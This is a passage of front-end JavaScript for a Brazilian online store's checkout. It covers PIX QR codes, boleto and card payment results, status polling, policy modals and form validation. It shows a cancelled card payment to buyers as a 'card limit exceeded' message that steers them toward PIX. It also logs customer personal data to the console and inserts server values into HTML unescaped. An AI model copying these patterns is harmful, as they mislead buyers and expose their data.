    console.log('[Pix] QR Code extraído:', qrCode);
    console.log('[Pix] Transaction Hash:', transactionHash);

    // Gerar URL do QR Code usando API externa
    const qrCodeUrl = qrCode ? `https://api.qrserver.com/v1/create-qr-code/?size=220x220&data=${encodeURIComponent(qrCode)}` : null;

    // Gerar conteúdo do código PIX com tratamento para strings longas (移动端优化)
    const pixCodeDisplay = qrCode ? `
        <div class="pix-code-container" style="margin-top: 20px;">
            <p class="pix-label" style="color: #D4AF37; font-size: 14px; margin-bottom: 8px;">Ou copie o código PIX:</p>
            <div class="pix-code" id="pixCodeText" style="font-size: 11px; word-break: break-all; background: #ffffff; color: #1a1a1a; padding: 12px; border-radius: 8px; margin: 10px 0; border: 1px solid #D4AF37; font-family: 'Courier New', monospace; line-height: 1.5; max-height: 120px; overflow-y: auto;">${qrCode}</div>
            <button class="copy-pix-btn" onclick="copyPixCode()" style="background: #D4AF37; color: #000; border: none; padding: 12px 24px; border-radius: 8px; cursor: pointer; font-weight: bold; width: 100%; margin-top: 10px;">📋 Copiar Código PIX</button>
        </div>
    ` : `
        <div class="pix-code-container" style="margin-top: 20px; text-align: center;">
            <p class="pix-label" style="color: #D4AF37; font-size: 14px; margin-bottom: 8px;">Código PIX:</p>
            <div class="pix-code" style="font-size: 12px; word-break: break-all; background: #f8f9fa; color: #666; padding: 15px; border-radius: 8px; margin: 10px 0; border: 1px dashed #D4AF37; font-family: 'Courier New', monospace; line-height: 1.5;">Código não disponível. Tente novamente ou aguarde.</div>
            <button onclick="location.reload()" style="background: #D4AF37; color: #000; border: none; padding: 12px 24px; border-radius: 8px; cursor: pointer; font-weight: bold; width: 100%; margin-top: 10px;">🔄 Recarregar Página</button>
        </div>
    `;

    // Gerar conteúdo do QR Code
    const qrCodeDisplay = qrCode ? `
        <div style="background: #fff; padding: 15px; border-radius: 12px; max-width: 250px; margin: 0 auto 20px; box-shadow: 0 4px 15px rgba(0,0,0,0.3);">
            ${qrCodeUrl ? `<img id="qrCodeImage" src="${qrCodeUrl}" alt="QR Code PIX" style="width: 100%; height: auto; display: block;" onerror="this.style.display='none'; document.getElementById('qrCodeFallback').style.display='block'; generateLocalQRCode('${qrCode.replace(/'/g, "\\'")}')">` : ''}
            <div id="qrCodeFallback" style="display: none; text-align: center;"></div>
        </div>
    ` : `
        <div style="background: #f8f9fa; padding: 30px; border-radius: 12px; max-width: 250px; margin: 0 auto 20px; text-align: center; border: 2px dashed #D4AF37;">
            <p style="font-size: 48px; margin: 0 0 10px 0;">📱</p>
            <p style="color: #666; font-size: 14px;">QR Code não disponível</p>
        </div>
    `;

    content.innerHTML = `
        <div class="payment-result" style="padding: 20px;">
            <div class="payment-success-icon" style="font-size: 48px; margin-bottom: 15px; text-align: center;">📱</div>
            <h3 style="color: #D4AF37; margin-bottom: 10px; text-align: center;">Pague com PIX!</h3>
            <p style="color: #aaa; font-size: 14px; margin-bottom: 20px; text-align: center;">Escaneie o QR Code abaixo com seu aplicativo de banco:</p>

            ${qrCodeDisplay}

            ${pixCodeDisplay}

            <div class="payment-warning" style="background: rgba(212, 175, 55, 0.1); border: 1px solid rgba(212, 175, 55, 0.3); color: #D4AF37; padding: 15px; border-radius: 8px; margin: 20px 0; font-size: 13px;">
                <strong>⚠️ Importante:</strong> Efetue o pagamento agora. O pedido só será confirmado após a compensação do PIX.
            </div>

            <p class="transaction-hash" style="font-size: 11px; color: #666; margin-bottom: 15px; text-align: center;">ID do pedido: <span style="color: #888; font-family: monospace;">${transactionHash || 'N/A'}</span></p>

            <button class="verify-btn" id="verifyPaymentBtn" onclick="verifyPaymentStatus('${transactionHash || ''}')" style="background: linear-gradient(135deg, #22c55e 0%, #16a34a 100%); color: #fff; border: none; padding: 14px 28px; border-radius: 8px; cursor: pointer; font-weight: bold; width: 100%; margin-top: 10px;">✅ Já Paguei - Verificar Pagamento</button>
            <p id="paymentStatusResult" style="margin-top: 15px; font-size: 14px;"></p>
            
            <div style="display: flex; gap: 10px; margin-top: 15px;">
                <button onclick="backToForm();" style="background: rgba(212, 175, 55, 0.1); color: #D4AF37; border: 1px solid rgba(212, 175, 55, 0.3); padding: 12px; border-radius: 8px; cursor: pointer; flex: 1;">← Voltar aos Dados</button>
                <button onclick="closeCheckoutModal();" style="background: transparent; color: #888; border: 1px solid #444; padding: 12px; border-radius: 8px; cursor: pointer; flex: 1;">✕ Fechar</button>
            </div>
        </div>
    `;
    content.style.display = 'block';

    // Se a API externa falhou, gerar QR Code localmente
    if (qrCode && !qrCodeUrl) {
        generateLocalQRCode(qrCode);
    }
}

// Função para gerar QR Code localmente usando a biblioteca qrcode.js
function generateLocalQRCode(pixCode) {
    const fallbackContainer = document.getElementById('qrCodeFallback');
    const qrImage = document.getElementById('qrCodeImage');
    
    if (fallbackContainer && typeof QRCode !== 'undefined') {
        console.log('[QR Code] Gerando QR Code localmente...');
        fallbackContainer.style.display = 'block';
        
        // Limpar container anterior
        fallbackContainer.innerHTML = '';
        
        // Gerar novo QR Code
        new QRCode(fallbackContainer, {
            text: pixCode,
            width: 220,
            height: 220,
            colorDark: '#000000',
            colorLight: '#ffffff',
            correctLevel: QRCode.CorrectLevel.M
        });
        
        // Ocultar imagem da API que falhou
        if (qrImage) {
            qrImage.style.display = 'none';
        }
    } else if (!typeof QRCode !== 'undefined') {
        console.warn('[QR Code] Biblioteca não carregada');
    }
}

// Função para verificar status real do pagamento
async function verifyPaymentStatus(transactionHash) {
    if (!transactionHash) {
        document.getElementById('paymentStatusResult').innerHTML = '<div style="background: rgba(239, 68, 68, 0.15); border: 1px solid rgba(239, 68, 68, 0.4); color: #ef4444; padding: 15px; border-radius: 8px; text-align: center;"><p style="font-size: 20px; margin: 0 0 8px 0;">⚠️</p><p style="font-weight: bold; margin: 0;">ID do pedido não encontrado</p></div>';
        return;
    }

    const btn = document.getElementById('verifyPaymentBtn');
    const originalBtnText = btn ? btn.textContent : 'Verificar Status';
    
    if (btn) {
        btn.disabled = true;
        btn.textContent = '🔄 Verificando...';
    }
    document.getElementById('paymentStatusResult').innerHTML = '<div style="background: rgba(212, 175, 55, 0.15); border: 1px solid rgba(212, 175, 55, 0.4); color: #D4AF37; padding: 15px; border-radius: 8px; text-align: center;"><p style="font-size: 20px; margin: 0 0 8px 0;">🔄</p><p style="margin: 0;">Consultando status do pagamento...</p></div>';

    try {
        console.log('[Verify] Consultando status para hash:', transactionHash);
        
        // Tentar diferentes formatos de URL
        const url1 = `${API_CONFIG.endpoints.checkStatus}?transactionHash=${transactionHash}`;
        const url2 = `/.netlify/functions/status?transactionHash=${transactionHash}`;
        
        console.log('[Verify] URLs a tentar:', url1);
        console.log('[Verify] URL alternativa:', url2);
        
        // Tentar primeira URL
        let response;
        let result;
        let usedUrl = '';
        
        try {
            response = await fetch(url1, {
                method: 'GET',
                headers: { 'Content-Type': 'application/json' }
            });
            usedUrl = url1;
        } catch (e) {
            console.log('[Verify] URL principal falhou, tentando alternativa:', e.message);
            // Tentar URL alternativa
            response = await fetch(url2, {
                method: 'GET',
                headers: { 'Content-Type': 'application/json' }
            });
            usedUrl = url2;
        }
        
        console.log('[Verify] Response status:', response.status, 'URL:', usedUrl);

        if (!response.ok) {
            throw new Error(`HTTP ${response.status}: ${response.statusText}`);
        }

        result = await response.json();
        console.log('[Verify] Resposta completa:', JSON.stringify(result, null, 2));

        if (result.success) {
            const status = result.data?.status?.toLowerCase() || result.status?.toLowerCase() || 'unknown';
            console.log('[Verify] Status encontrado:', status);

            // Mapa de tradução de status
            const statusMap = {
                'approved': { icon: '✅', title: 'Pagamento Confirmado!', msg: 'O seu pedido foi aprovado com sucesso.', bg: 'rgba(34, 197, 94, 0.15)', color: '#22c55e' },
                'paid': { icon: '✅', title: 'Pagamento Confirmado!', msg: 'O seu pedido foi aprovado com sucesso.', bg: 'rgba(34, 197, 94, 0.15)', color: '#22c55e' },
                'completed': { icon: '✅', title: 'Pagamento Confirmado!', msg: 'O seu pedido foi aprovado com sucesso.', bg: 'rgba(34, 197, 94, 0.15)', color: '#22c55e' },
                'pending': { icon: '⏳', title: 'Pagamento Pendente', msg: 'O pagamento ainda está sendo processado.<br>Aguarde a compensação (até 30 minutos para PIX).', bg: 'rgba(212, 175, 55, 0.15)', color: '#D4AF37' },
                'waiting_payment': { icon: '⏳', title: 'Aguardando Pagamento', msg: 'O pagamento ainda não foi realizado.<br>Efetue o pagamento para continuar.', bg: 'rgba(212, 175, 55, 0.15)', color: '#D4AF37' },
                'pending_payment': { icon: '⏳', title: 'Pagamento Pendente', msg: 'O pagamento está aguardando compensação.<br>Isso pode levar alguns minutos.', bg: 'rgba(212, 175, 55, 0.15)', color: '#D4AF37' },
                'open': { icon: '⏳', title: 'Pagamento Aberto', msg: 'A transação está aberta aguardando pagamento.', bg: 'rgba(212, 175, 55, 0.15)', color: '#D4AF37' },
                'processing': { icon: '⚙️', title: 'Processando', msg: 'O pagamento está sendo processado pela operadora.', bg: 'rgba(59, 130, 246, 0.15)', color: '#3b82f6' },
                'cancelled': { icon: '❌', title: 'Pagamento Cancelado', msg: 'A transação foi cancelada.', bg: 'rgba(239, 68, 68, 0.15)', color: '#ef4444' },
                'canceled': { icon: '❌', title: 'Pagamento Cancelado', msg: 'A transação foi cancelada.', bg: 'rgba(239, 68, 68, 0.15)', color: '#ef4444' },
                'failed': { icon: '❌', title: 'Pagamento Falhou', msg: 'O pagamento não foi aprovado. Tente novamente.', bg: 'rgba(239, 68, 68, 0.15)', color: '#ef4444' },
                'expired': { icon: '⏰', title: 'Pagamento Expirado', msg: 'O prazo para pagamento expirou.', bg: 'rgba(239, 68, 68, 0.15)', color: '#ef4444' }
            };
            
            const statusInfo = statusMap[status] || { icon: '❓', title: 'Status: ' + status, msg: 'Status desconhecido. Entre em contato com o suporte.', bg: 'rgba(100, 100, 100, 0.15)', color: '#888' };
            
            document.getElementById('paymentStatusResult').innerHTML = `
                <div style="background: ${statusInfo.bg}; border: 1px solid ${statusInfo.color}40; border-radius: 12px; padding: 20px; text-align: center;">
                    <p style="font-size: 48px; margin: 0 0 12px 0;">${statusInfo.icon}</p>
                    <p style="font-size: 18px; font-weight: bold; margin: 0 0 8px 0; color: ${statusInfo.color};">${statusInfo.title}</p>
                    <p style="font-size: 13px; margin: 0; color: #aaa; line-height: 1.6;">${statusInfo.msg}</p>
                </div>
            `;
            
            if (status === 'approved' || status === 'paid' || status === 'completed') {
                if (btn) btn.style.display = 'none';
                setTimeout(() => {
                    window.location.href = 'checkout-success.html';
                }, 2000);
            } else if (btn) {
                btn.disabled = false;
                btn.textContent = '🔄 Verificar Novamente';
            }
        } else {
            console.error('[Verify] Erro na resposta:', result.error);
            document.getElementById('paymentStatusResult').innerHTML = `<div style="background: rgba(239, 68, 68, 0.15); border: 1px solid rgba(239, 68, 68, 0.4); color: #ef4444; padding: 15px; border-radius: 8px; text-align: center;"><p style="font-size: 20px; margin: 0 0 8px 0;">⚠️</p><p style="font-weight: bold; margin: 0;">${result.error || 'Erro ao verificar status'}</p><p style="font-size: 12px; margin-top: 8px;">Tente novamente em alguns segundos.</p></div>`;
            if (btn) {
                btn.disabled = false;
                btn.textContent = '🔄 Tentar Novamente';
            }
        }
    } catch (error) {
        console.error('[Verify] Erro de conexão:', error);
        document.getElementById('paymentStatusResult').innerHTML = `<div style="background: rgba(239, 68, 68, 0.15); border: 1px solid rgba(239, 68, 68, 0.4); color: #ef4444; padding: 15px; border-radius: 8px; text-align: center;"><p style="font-size: 20px; margin: 0 0 8px 0;">⚠️</p><p style="font-weight: bold; margin: 0;">Erro de conexão</p><p style="font-size: 12px; margin-top: 8px; color: #aaa;">${error.message}</p><p style="font-size: 12px; margin-top: 8px;">Verifique sua internet e tente novamente.</p></div>`;
        if (btn) {
            btn.disabled = false;
            btn.textContent = '🔄 Tentar Novamente';
        }
    }
}

function showBilletPayment(data) {
    checkoutLoading.style.display = 'none';
    
    const content = document.getElementById('checkoutContent');
    
    // Forçar exibição do conteúdo - garantir que todos os estilos de ocultação sejam removidos
    content.style.display = 'block';
    content.style.visibility = 'visible';
    content.style.opacity = '1';
    content.style.position = 'relative';
    content.style.zIndex = '10';
    
    // Remover qualquer classe CSS que possa estar ocultando o elemento
    content.classList.remove('hidden');
    content.classList.remove('collapsed');
    
    const transactionHash = data.transaction_hash || data.data?.hash;
    
    // Armazenar linha digitável na variável global
    currentBilletLine = data.billet_digitable_line || '';
    
    content.innerHTML = `
        <div class="payment-result">
            <div class="payment-success-icon">📄</div>
            <h3>Boleto Gerado!</h3>
            <p>Pague o boleto para confirmar seu pedido:</p>
            
            ${data.billet_url ? `<a href="${data.billet_url}" target="_blank" class="billet-link-btn">🖨️ Imprimir Boleto</a>` : ''}
            
            ${data.billet_digitable_line ? `
            <div class="billet-info">
                <p>Linha Digitável:</p>
                <div class="billet-line">${data.billet_digitable_line}</div>
                <button class="copy-billet-btn" onclick="copyBilletLine()">📋 Copiar Linha Digitável</button>
            </div>
            ` : ''}
            
            <p class="transaction-hash">ID: ${transactionHash || 'N/A'}</p>
            
            <div class="payment-warning" style="background: #fff3cd; color: #856404; padding: 12px; border-radius: 8px; margin: 15px 0; font-size: 14px;">
                <strong>⚠️ Importante:</strong> O pagamento será confirmado após a compensação do boleto (até 3 dias úteis).
            </div>
            
            <button class="close-btn" style="background: #D4AF37; color: #000; font-weight: bold;" id="verifyPaymentBtn" onclick="verifyPaymentStatus('${transactionHash || ''}')">🔄 Verificar Status do Pagamento</button>
            <p id="paymentStatusResult" style="margin-top: 15px; font-size: 14px;"></p>
        </div>
    `;
    content.style.display = 'block';
}

function showCreditCardPaymentResult(data) {
    checkoutLoading.style.display = 'none';
    
    const content = document.getElementById('checkoutContent');
    
    // Forçar exibição do conteúdo - garantir que todos os estilos de ocultação sejam removidos
    content.style.display = 'block';
    content.style.visibility = 'visible';
    content.style.opacity = '1';
    content.style.position = 'relative';
    content.style.zIndex = '10';
    
    // Remover qualquer classe CSS que possa estar ocultando o elemento
    content.classList.remove('hidden');
    content.classList.remove('collapsed');
    
    const transactionHash = data.transaction_hash || data.data?.hash;
    const status = data.status || data.data?.status || 'pending';
    const isApproved = status === 'approved' || status === 'paid';
    const isPending = status === 'pending' || status === 'waiting_payment' || status === 'processing';
    
    // Determinar ícone e cor baseados no status
    let statusIcon, statusTitle, statusMessage, statusColor, statusBg;
    
    if (isApproved) {
        statusIcon = '✅';
        statusTitle = 'Pagamento Aprovado!';
        statusMessage = 'Seu pedido foi confirmado e está sendo preparado para envio.';
        statusColor = '#22c55e';
        statusBg = 'rgba(34, 197, 94, 0.15)';
    } else if (isPending) {
        statusIcon = '⏳';
        statusTitle = 'Pagamento em Análise';
        statusMessage = 'O pagamento está sendo processado pela operadora do cartão. Você receberá um e-mail com a confirmação em breve.';
        statusColor = '#D4AF37';
        statusBg = 'rgba(212, 175, 55, 0.15)';
    } else if (status === 'cancelled' || status === 'canceled' || status === 'limit_exceeded' || status === 'amount_limit_exceeded' || status === 'transaction_limit') {
        statusIcon = '⚠️';
        statusTitle = 'Limite do Cartão Ultrapassado';
        statusMessage = 'O valor da compra ultrapassou o limite diário/transação do seu cartão. Recomendamos: <br><br>✅ Pagar com PIX (sem limite) <br>✅ Dividir em parcelas menores <br>✅ Usar outro cartão';
        statusColor = '#f59e0b';
        statusBg = 'rgba(245, 158, 11, 0.15)';
    } else if (status === 'refunded' || status === 'chargeback') {
        statusIcon = '↩️';
        statusTitle = 'Pagamento Estornado';
        statusMessage = 'O valor foi estornado para o seu cartão.';
        statusColor = '#8b5cf6';
        statusBg = 'rgba(139, 92, 246, 0.15)';
    } else {
        statusIcon = '❓';
        statusTitle = 'Status: ' + status;
        statusMessage = 'Entre em contato com o suporte para mais informações.';
        statusColor = '#888';
        statusBg = 'rgba(136, 136, 136, 0.15)';
    }
    
    content.innerHTML = `
        <div class="payment-result" style="padding: 24px;">
            <div style="font-size: 56px; margin-bottom: 16px; text-align: center;">${statusIcon}</div>
            <h3 style="color: ${statusColor}; margin-bottom: 12px; text-align: center; font-size: 20px;">${statusTitle}</h3>
            <p style="color: #aaa; font-size: 14px; margin-bottom: 20px; text-align: center; line-height: 1.6;">${statusMessage}</p>
            
            <div style="background: ${statusBg}; border: 1px solid ${statusColor}40; border-radius: 12px; padding: 16px; margin-bottom: 20px;">
                <div style="display: flex; justify-content: space-between; margin-bottom: 8px;">
                    <span style="color: #888; font-size: 13px;">Status</span>
                    <span style="color: ${statusColor}; font-weight: 600; font-size: 13px; text-transform: capitalize;">${status.replace('_', ' ')}</span>
                </div>
                <div style="display: flex; justify-content: space-between;">
                    <span style="color: #888; font-size: 13px;">ID do Pedido</span>
                    <span style="color: #666; font-size: 13px; font-family: monospace;">${transactionHash ? transactionHash.substring(0, 12) + '...' : 'N/A'}</span>
                </div>
            </div>
            
            ${isApproved ? `
                <button onclick="window.location.href='checkout-success.html';" style="width: 100%; padding: 14px; background: ${statusColor}; color: #fff; border: none; border-radius: 8px; font-weight: 600; cursor: pointer; font-size: 15px;">Ver Detalhes do Pedido</button>
            ` : `
                <button class="verify-btn" id="verifyPaymentBtn" onclick="verifyPaymentStatus('${transactionHash || ''}')" style="width: 100%; padding: 14px; background: linear-gradient(135deg, #22c55e 0%, #16a34a 100%); color: #fff; border: none; border-radius: 8px; font-weight: 600; cursor: pointer; font-size: 15px; margin-bottom: 12px;">🔄 Verificar Novamente</button>
                <p id="paymentStatusResult" style="font-size: 14px;"></p>
            `}
            
            <div style="display: flex; gap: 10px; margin-top: 16px;">
                <button onclick="backToForm();" style="flex: 1; padding: 12px; background: rgba(212, 175, 55, 0.1); color: #D4AF37; border: 1px solid rgba(212, 175, 55, 0.3); border-radius: 8px; cursor: pointer; font-size: 14px;">← Voltar</button>
                <button onclick="closeCheckoutModal();" style="flex: 1; padding: 12px; background: transparent; color: #888; border: 1px solid #444; border-radius: 8px; cursor: pointer; font-size: 14px;">✕ Fechar</button>
            </div>
        </div>
    `;
    content.style.display = 'block';
}

function copyPixCode() {
    if (currentPixCode) {
        navigator.clipboard.writeText(currentPixCode).then(() => {
            showToast('Código PIX copiado!', 'success');
        }).catch(() => {
            showToast('Erro ao copiar', 'error');
        });
    } else {
        // Fallback: tentar copiar do elemento DOM
        const pixCodeElement = document.getElementById('pixCodeText');
        if (pixCodeElement) {
            navigator.clipboard.writeText(pixCodeElement.textContent.trim()).then(() => {
                showToast('Código PIX copiado!', 'success');
            }).catch(() => {
                showToast('Erro ao copiar', 'error');
            });
        } else {
            showToast('Código PIX não disponível', 'error');
        }
    }
}

function copyBilletLine() {
    if (currentBilletLine) {
        navigator.clipboard.writeText(currentBilletLine).then(() => {
            showToast('Linha digitável copiada!', 'success');
        }).catch(() => {
            showToast('Erro ao copiar', 'error');
        });
    } else {
        showToast('Linha digitável não disponível', 'error');
    }
}

// ========================================
// MODAL DE TERMOS E POLÍTICAS
// ========================================

const termsModal = document.getElementById('termsModal');
const closeTermsBtn = document.getElementById('closeTerms');
const closeTermsBtnFooter = document.getElementById('closeTermsBtn');
const termsTitle = document.getElementById('termsTitle');
const termsBody = document.getElementById('termsBody');

// Conteúdo dos termos e políticas
const termsContent = {
    terms: {
        title: 'Termos de Uso',
        content: `
            <h3>1. Introdução</h3>
            <p>Bem-vindo à Aurum Street! Estes Termos de Uso regem o uso do nosso site e serviços. Ao acessar e utilizar nossa plataforma, você concorda com estes termos integralmente.</p>
            
            <h3>2. Uso do Site</h3>
            <p>O usuário compromete-se a utilizar o site apenas para fins lícitos e de acordo com estes Termos de Uso. É proibido:</p>
            <ul>
                <li>Utilizar o site para práticas fraudulentas ou ilegais</li>
                <li>Interferir no funcionamento normal do site</li>
                <li>Tentar acessar áreas restritas do sistema</li>
                <li>Reproduzir ou distribuir conteúdo sem autorização</li>
            </ul>
            
            <h3>3. Cadastro e Conta</h3>
            <p>Para realizar compras, o usuário deve fornecer informações verdadeiras e mantê-las atualizadas. O usuário é responsável por manter a confidencialidade de sua conta e senha.</p>
            
            <h3>4. Propriedade Intelectual</h3>
            <p>Todo o conteúdo do site, incluindo textos, imagens, logos e design, é propriedade da Aurum Street ou de seus licenciados e está protegido por leis de propriedade intelectual.</p>
            
            <h3>5. Limitação de Responsabilidade</h3>
            <p>A Aurum Street não se responsabiliza por danos indiretos, incidentais ou consequenciais decorrentes do uso do site ou incapacidade de utilizá-lo.</p>
            
            <h3>6. Disposições Gerais</h3>
            <p>Estes Termos de Uso podem ser alterados a qualquer momento sem prévio aviso. O uso contínuo do site após alterações implica aceitação dos novos termos.</p>
        `
    },
    privacy: {
        title: 'Política de Privacidade',
        content: `
            <h3>1. Coleta de Informações</h3>
            <p>A Aurum Street coleta informações fornecidas pelos usuários durante o cadastro, navegação e compra em nosso site, incluindo nome, e-mail, telefone, endereço e dados de pagamento.</p>
            
            <h3>2. Uso das Informações</h3>
            <p>As informações coletadas são utilizadas para:</p>
            <ul>
                <li>Processamento de pedidos e entregas</li>
                <li>Comunicação sobre status de pedidos</li>
                <li>Envio de promoções e novidades (com consentimento)</li>
                <li>Melhoria da experiência de navegação</li>
                <li>Prevenção de fraudes</li>
            </ul>
            
            <h3>3. Proteção de Dados</h3>
            <p>Utilizamos medidas de segurança técnicas e organizacionais para proteger suas informações pessoais contra acesso não autorizado, alteração ou destruição.</p>
            
            <h3>4. Compartilhamento de Dados</h3>
            <p>Seus dados podem ser compartilhados com parceiros de entrega, processadores de pagamento e autoridades legais quando necessário para cumprimento de leis ou obrigações legais.</p>
            
            <h3>5. Cookies</h3>
            <p>O site utiliza cookies para melhorar sua experiência. Você pode desativar cookies nas configurações do seu navegador, mas isso pode afetar funcionalidades do site.</p>
            
            <h3>6. Seus Direitos</h3>
            <p>Você tem direito a acessar, corrigir ou excluir seus dados pessoais. Para exercer esses direitos, entre em contato através do e-mail aurumstreet1@gmail.com.</p>
        `
    },
    shipping: {
        title: 'Política de Entregas',
        content: `
            <h3>1. Formas de Envio</h3>
            <p>A Aurum Street oferece as seguintes opções de entrega:</p>
            <ul>
                <li>Frete Grátis para todo o Brasil</li>
                <li>Entrega via Uber Flash para região metropolitana</li>
                <li>Correios (PAC e Sedex)</li>
            </ul>
            
            <h3>2. Prazos de Entrega</h3>
            <p>Os prazos de entrega variam de acordo com a localização e forma de envio escolhida. O prazo médio é de 3 a 10 dias úteis para capitais e 5 a 15 dias úteis para demais localidades.</p>
            
            <h3>3. Rastreamento</h3>
            <p>Todos os pedidos são enviados com código de rastreamento, que será enviado por e-mail após a postagem. Você pode acompanhar o status da entrega através do nosso site ou aplicativos dos correios.</p>
            
            <h3>4. Problemas na Entrega</h3>
            <p>Caso haja problema na entrega (endereço incorreto, ausência do receptor, etc.), nossa equipe entrará em contato para resolver a situação. O cliente é responsável por fornecer informações de entrega corretas.</p>
            
            <h3>5. Danos Durante o Transporte</h3>
            <p>Se o produto chegar danificado, entre em contato imediatamente através do WhatsApp ou e-mail para que possamos providenciar a troca ou reembolso.</p>
        `
    },
    returns: {
        title: 'Política de Trocas e Devoluções',
        content: `
            <h3>1. Direito de Arrependimento</h3>
            <p>O cliente tem até 7 dias corridos após o recebimento do produto para exercer o direito de arrependimento, conforme Código de Defesa do Consumidor.</p>
            
            <h3>2. Condições para Troca ou Devolução</h3>
            <p>O produto deve estar:</p>
            <ul>
                <li>Na embalagem original</li>
                <li>Com todas as etiquetas afixadas</li>
                <li>Sem sinais de uso</li>
                <li>Accompany de nota fiscal</li>
            </ul>
            
            <h3>3. Processo de Troca</h3>
            <p>Para solicitar troca, entre em contato através do WhatsApp ou e-mail informando o motivo. Após aprovação, você receberá instruções sobre como enviar o produto de volta.</p>
            
            <h3>4. Reembolso</h3>
            <p>O reembolso será realizado após análise do produto devolvido, em até 5 dias úteis, utilizando a mesma forma de pagamento utilizada na compra.</p>
            
            <h3>5. Produtos com Defeito</h3>
            <p>Produtos com defeito de fabricação serão trocados ou reembolsados integralmente. O custo do frete de devolução será borneado pela Aurum Street.</p>
            
            <h3>6. Contato</h3>
            <p>Para iniciar o processo de troca ou devolução, entre em contato:</p>
            <ul>
                <li>WhatsApp: (11) 91666-3755</li>
                <li>E-mail: aurumstreet1@gmail.com</li>
            </ul>
        `
    }
};

function showTerms(type) {
    const content = termsContent[type];
    if (!content) return;
    
    termsTitle.textContent = content.title;
    termsBody.innerHTML = content.content;
    termsModal.classList.add('active');
    document.body.classList.add('locked');
}

function closeTermsModal() {
    termsModal.classList.remove('active');
    document.body.classList.remove('locked');
}

// Event listeners do modal de termos
if (closeTermsBtn) {
    closeTermsBtn.addEventListener('click', closeTermsModal);
}

if (closeTermsBtnFooter) {
    closeTermsBtnFooter.addEventListener('click', closeTermsModal);
}

if (termsModal) {
    termsModal.querySelector('.modal-overlay').addEventListener('click', closeTermsModal);
}

// ========================================
// EVENT LISTENERS
// ========================================

mobileMenuBtn.addEventListener('click', () => {
    mobileMenuBtn.classList.toggle('active');
    navMenu.classList.toggle('active');
});

filterBtns.forEach(btn => {
    btn.addEventListener('click', () => {
        filterBtns.forEach(b => b.classList.remove('active'));
        btn.classList.add('active');
        renderProducts(btn.dataset.category);
    });
});

navLinks.forEach(link => {
    link.addEventListener('click', (e) => {
        e.preventDefault();
        navLinks.forEach(l => l.classList.remove('active'));
        link.classList.add('active');
        renderProducts(link.dataset.category);
        mobileMenuBtn.classList.remove('active');
        navMenu.classList.remove('active');
    });
});

cartBtn.addEventListener('click', openCart);
closeCartBtn.addEventListener('click', closeCart);
cartOverlay.addEventListener('click', closeCart);

// Checkout form submission
console.log('[Checkout] Verificando elementos do formulário...');
console.log('[Checkout] checkoutForm existe:', checkoutForm !== null);

if (checkoutForm) {
    console.log('[Checkout] ✅ Event listener de submit sendo attachado');
    
    checkoutForm.addEventListener('submit', (e) => {
        e.preventDefault();
        
        console.log('');
        console.log('╔══════════════════════════════════════════════════════════════╗');
        console.log('║ [Checkout] ████ FORMULÁRIO SUBMETIDO - INVICTUSPAY ████       ║');
        console.log('╚══════════════════════════════════════════════════════════════╝');
        
        const customerName = getElementValue('customerName');
        const customerEmail = getElementValue('customerEmail');
        const customerPhone = getElementValue('customerPhone');
        const customerCPF = getElementValue('customerCPF');
    
    const customerAddress = getElementValue('customerAddress');
    const customerNumber = getElementValue('customerNumber');
    const customerComplement = getElementValue('customerComplement', '');
    const customerNeighborhood = getElementValue('customerNeighborhood');
    const customerCity = getElementValue('customerCity');
    const customerState = getElementValue('customerState');
    const customerCEP = getElementValue('customerCEP');
    
    const paymentMethodElement = document.getElementById('paymentMethod');
    const paymentMethod = paymentMethodElement ? paymentMethodElement.value : 'pix';
    const installments = getElementValue('installments', '1');
    
    console.log('[Checkout] paymentMethod do select:', `"${paymentMethod}"`);
    console.log('[Checkout] paymentMethod é pix?:', paymentMethod === 'pix');
    
    // Se não tiver seleccionado, usar pix por defeito
    const finalPaymentMethod = (!paymentMethod || paymentMethod === '') ? 'pix' : paymentMethod;
    
    const customerData = {
        name: customerName,
        email: customerEmail,
        phone: customerPhone,
        cpf: customerCPF,
        document: customerCPF,
        address: {
            street: customerAddress,
            number: customerNumber,
            complement: customerComplement,
            neighborhood: customerNeighborhood,
            city: customerCity,
            state: customerState,
            zipcode: customerCEP.replace(/\D/g, '')
        }
    };
    
    console.log('[Checkout] Dados do cliente:', JSON.stringify(customerData, null, 2));
    
    // Validar valor da compra antes de processar
    const cartTotal = cart.reduce((sum, item) => sum + (item.price * item.quantity), 0);
    
    if (cartTotal > 2000) {
        checkoutError.querySelector('span').innerHTML = '⚠️ <strong>Atenção:</strong> Para compras acima de R$ 2.000, recomendamos pagamento via PIX ou boleto para evitar problemas com limite de cartão. Deseja continuar mesmo assim?';
        checkoutError.style.display = 'flex';
        console.log('[Checkout] AVISO: Valor alto detectado:', cartTotal);
        return;
    }
    
    if (!customerData.name || !customerData.email || !customerData.cpf) {
        checkoutError.querySelector('span').textContent = 'Por favor, preencha todos os campos obrigatórios.';
        checkoutError.style.display = 'flex';
        console.log('[Checkout] ERRO: Campos obrigatórios não preenchidos');
        return;
    }
    
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (!emailRegex.test(customerData.email)) {
        checkoutError.querySelector('span').textContent = 'Por favor, insira um e-mail válido.';
        checkoutError.style.display = 'flex';
        console.log('[Checkout] ERRO: E-mail inválido');
        return;
    }
    
    const cpfRegex = /^\d{3}\.\d{3}\.\d{3}-\d{2}$|^\d{11}$/;
    if (!cpfRegex.test(customerData.cpf)) {
        checkoutError.querySelector('span').textContent = 'Por favor, insira um CPF válido (formato: 000.000.000-00).';
        checkoutError.style.display = 'flex';
        console.log('[Checkout] ERRO: CPF inválido');
        return;
    }
    
    // Verificar se há produtos no carrinho com hash configurada
    const productsWithHash = cart.filter(item => item.product_hash);
    if (productsWithHash.length === 0) {
        checkoutError.querySelector('span').textContent = 'Nenhum produto tem hash configurada. Entre em contato com o suporte.';
        checkoutError.style.display = 'flex';
        console.log('[Checkout] ERRO: Nenhum produto com hash');
        return;
    }
    
    // Coletar dados do cartão se for pagamento com cartão de crédito
    let cardData = null;
    if (finalPaymentMethod === 'credit_card') {
        const cardNumber = getElementValue('cardNumber');
        const cardHolder = getElementValue('cardHolder');
        const cardExpiry = getElementValue('cardExpiry');
        const cardCVV = getElementValue('cardCVV');
        
        // Validar campos do cartão
        if (!cardNumber || cardNumber.replace(/\s/g, '').length < 16) {
            checkoutError.querySelector('span').textContent = 'Por favor, preencha o número do cartão completo.';
            checkoutError.style.display = 'flex';
            console.log('[Checkout] ERRO: Número do cartão incompleto');
            return;
        }
        
        if (!cardHolder) {
            checkoutError.querySelector('span').textContent = 'Por favor, preencha o nome no cartão.';
            checkoutError.style.display = 'flex';
            console.log('[Checkout] ERRO: Nome no cartão vazio');
            return;
        }
